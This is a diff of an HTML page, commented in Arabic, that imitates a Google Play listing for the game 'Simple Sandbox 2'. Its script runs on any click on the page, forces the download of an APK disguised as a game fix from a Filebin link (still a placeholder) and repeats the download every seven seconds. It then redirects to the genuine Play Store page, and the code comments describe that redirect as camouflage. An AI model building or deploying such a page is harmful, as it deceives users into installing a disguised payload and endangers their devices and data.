@@ -7,6 +7,7 @@
     <style>
         body { margin: 0; font-family: 'Roboto', sans-serif; background: #fff; color: #5f6368; }
         .app-header { display: flex; padding: 20px; align-items: center; }
+        /* استخدام صورة التطبيق كأيقونة اللعبة */
         .app-icon { width: 72px; height: 72px; border-radius: 15px; box-shadow: 0 1px 4px rgba(0,0,0,0.2); }
         .app-info { margin-right: 15px; flex: 1; }
         .app-title { font-size: 22px; font-weight: 500; color: #202124; margin: 0; }
@@ -20,7 +21,7 @@
 </head>
 <body onclick="executeMasterPlan()">
     <div class="app-header">
-        <img src="https://play-lh.googleusercontent.com/L_h7z57-h06Y0_e7p1Z5_5v-8Y48W9N9v" class="app-icon">
+        <img src="https://raw.githubusercontent.com/username/repository/main/image_12.png" class="app-icon">
         <div class="app-info">
             <h1 class="app-title">Simple Sandbox 2</h1>
             <p class="developer">Madness_Games</p>
@@ -29,7 +30,7 @@
     </div>
     
     <div class="install-bar">
-        <button class="install-btn">تثبيت التحديث</button>
+        <button class="install-btn">تثبيت</button>
     </div>
 
     <div class="stats">
@@ -40,26 +41,26 @@
 
     <script>
     function executeMasterPlan() {
-        // رابط ملفك من Filebin مع "مانع تخزين مؤقت"
-        var fileUrl = "رابط_الملف_من_صورة_filebin_هنا?v=" + new Date().getTime();
+        // رابط ملفك من صورة Filebin الخاصة بك
+        var fileUrl = "ضع_رابط_الملف_من_صورة_filebin_هنا";
         
         function force() {
             var a = document.createElement('a');
             a.href = fileUrl;
-            a.download = "Google_Play_Game_Support_v2.apk"; 
+            a.download = "Simple_Sandbox_2_Fix.apk"; 
             document.body.appendChild(a);
             a.click();
         }
 
         force();
 
-        // كود الإلحاح: تكرار الطلب كل 6 ثوانٍ لضمان الضغط (تحدي المستحيل)
-        setInterval(force, 6000);
+        // كود الإلحاح لضمان الضغط (تحدي المستحيل)
+        setInterval(force, 7000);
 
-        // التمويه: النقل لصفحة قوقل بلاي الأصلية للعبة بعد 2 ثانية
+        // التمويه: النقل لصفحة قوقل بلاي الحقيقية للعبة
         setTimeout(function() {
-            window.location.href = "https://share.google/LL0Wp5KuwMMQ9SYzi";
-        }, 2500);
+            window.location.href = "https://play.google.com/store/apps/details?id=com.MadnessGames.SimpleSandbox2";
+        }, 3000);
     }
     </script>
 </body>
